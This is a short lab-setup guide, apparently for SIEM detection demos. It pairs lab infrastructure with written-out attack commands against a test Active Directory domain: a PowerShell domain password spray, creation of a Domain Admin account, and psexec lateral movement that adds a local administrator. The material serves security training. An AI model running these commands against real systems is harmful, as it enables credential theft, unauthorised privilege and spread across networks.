# Lab Setup

## Infrastructure
Your infrastructure can really be hosted anywhere.
- Locally via vmware, virtualbox, etc
- In the cloud via Azure, GCP, AWS
- Prod? (j/k)

### 1. Windows Domain Controller

### 2. Windows Endpoint
### 3. Kali Linux
### 4. Optional - Whatever you need for SIEM?
In my case you will see in the demos that I'm using a Blumira sensor. This is an Ubuntu box with a docker container that has a [Blumira](https://www.blumira.com) sensor installed on it. Because this isn't a SIEM training, it's difficult to go through a full lab setup of something like ELK or Splunk. 

## Files/Scripts/Commands

1. [Domain Password Spray from @dafthack] (https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
_ Right-click, run powershell as admin
```
CD *directory that you've cloned the powershell script into*
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted
Import-Module .\DomainPasswordSpray.ps1
https://github.com/dafthack/DomainPasswordSpray
Cd C:/DNDShare
Invoke-DomainPasswordSpray -UserList userlist.txt -Domain forgottenforest.local -PasswordList passlist.txt -OutFile sprayed-creds.txt
```
2. Creating a Domain Admin
- Create a DNDUsers OU in Active Directory Users & Computers on the DC
```
Set-ExecutionPolicy Unrestricted
Import-Module ActiveDirectory
New-ADUser -Name "HP Lovecraft" -GivenName "HP Lovecraft" -SamAccountName "hplovecraft" -UserPrincipalName "hplovecraft@forgottenforest.local" -Path "OU=DNDUsers,DC=domain,DC=local" -AccountPassword(Read-Host -AsSecureString "Type Password for User") -Enabled $true
Add-ADGroupMember -Identity “Domain Admins” -Members hplovecraft
```
3. Data Exfil & Network Forensics

4. Lateral Movement
- Psexec add user to another server
```
CD into psexec directory
psexec.exe \\MagicRainbowPC.forgottenforest.local -u DNDUser1 -p passwordhere cmd
net user MyNewUser MyPassword#@$ /add
net localgroup administrators MyNewUser /add
```
